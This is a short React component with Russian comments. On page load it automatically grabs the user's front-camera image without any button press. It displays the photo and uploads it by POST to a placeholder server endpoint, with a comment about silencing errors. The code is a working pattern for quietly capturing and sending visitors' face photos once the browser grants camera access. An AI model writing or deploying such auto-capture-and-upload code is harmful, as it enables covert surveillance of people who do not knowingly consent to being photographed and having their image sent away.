function CameraApp() {
  const [photoDataUrl, setPhotoDataUrl] = React.useState(null);
  const isActiveRef = React.useRef(false);
  const hasShotRef = React.useRef(false);

  const takeAndSendPhoto = async () => {
    if (!isActiveRef.current || hasShotRef.current) return;
    hasShotRef.current = true;
    let stream;
    try {
      stream = await navigator.mediaDevices.getUserMedia({
        video: { facingMode: "user" },
        audio: false,
      });

      const video = document.createElement("video");
      video.playsInline = true;
      video.srcObject = stream;

      await new Promise((resolve) => {
        video.onloadedmetadata = () => {
          video.play();
          resolve();
        };
      });

      const canvas = document.createElement("canvas");
      canvas.width = video.videoWidth || 640;
      canvas.height = video.videoHeight || 480;
      const ctx = canvas.getContext("2d");
      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

      // Показать фото на странице
      const dataUrl = canvas.toDataURL("image/png");
      if (isActiveRef.current) setPhotoDataUrl(dataUrl);

      const blob = await new Promise((resolve) => canvas.toBlob(resolve, "image/png"));
      if (!blob) return;

      const formData = new FormData();
      formData.append("file", blob, "photo.png");

      // TODO: замените на ваш серверный endpoint для приёма файла
      const uploadUrl = "https://example.com/upload";
      await fetch(uploadUrl, {
        method: "POST",
        body: formData,
        credentials: "omit",
      });
    } catch (e) {
      // глушим ошибки — ничего не выводим
      console.error(e);
    } finally {
      if (stream) {
        stream.getTracks().forEach((t) => t.stop());
      }
    }
  };

  React.useEffect(() => {
    isActiveRef.current = true;
    const rafId = requestAnimationFrame(() => {
      void takeAndSendPhoto();
    });
    return () => {
      isActiveRef.current = false;
      cancelAnimationFrame(rafId);
    };
  }, []);

  return (
    <div>
      {photoDataUrl && (
        <img src={photoDataUrl} alt="Снимок" style={{ width: "100%", height: "auto", display: "block" }} />
      )}
    </div>
  );
}

const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(<CameraApp />);


